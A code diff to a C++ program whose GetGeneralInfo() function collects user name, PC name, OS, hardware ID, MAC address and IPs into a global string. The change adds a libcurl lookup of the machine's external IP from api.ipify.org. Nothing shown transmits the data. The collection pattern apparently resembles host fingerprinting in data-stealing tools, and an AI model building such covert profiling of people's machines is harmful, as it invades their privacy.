@@ -31,6 +31,8 @@
 #include <ctime>
 #include <sstream>
 #include <iphlpapi.h>
+#define CURL_STATICLIB
+#include <curl\curl.h>
 
 #define _CRT_SECURE_NO_WARNINGS
 
@@ -60,6 +62,8 @@ namespace global
 /// get User, Pc name, OS, Hwid , Mac, Time, IPs
 /// </summary>
 void GetGeneralInfo();
+
+size_t WriteCallback(char* , size_t , size_t , std::string* );
 
 void cursystem::GetSysInfo()
 {
@@ -221,4 +225,30 @@ void GetGeneralInfo()
 
 	global::info += "MAC Address: " + mac;
 
+
+	std::string ipAddress = "";
+
+	CURL* curl = curl_easy_init();
+	if (curl) {
+		curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org");
+		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &ipAddress);
+
+		CURLcode res = curl_easy_perform(curl);
+		if (res != CURLE_OK) {
+			std::cerr << "Failed to retrieve IP address: " << curl_easy_strerror(res) << std::endl;
+		}
+
+		curl_easy_cleanup(curl);
+	}
+	
+	global::info += "External IP Address: " + ipAddress;
+
+
+}
+
+size_t WriteCallback(char* contents, size_t size, size_t nmemb, std::string* output) {
+	size_t totalSize = size * nmemb;
+	output->append(contents, totalSize);
+	return totalSize;
 }
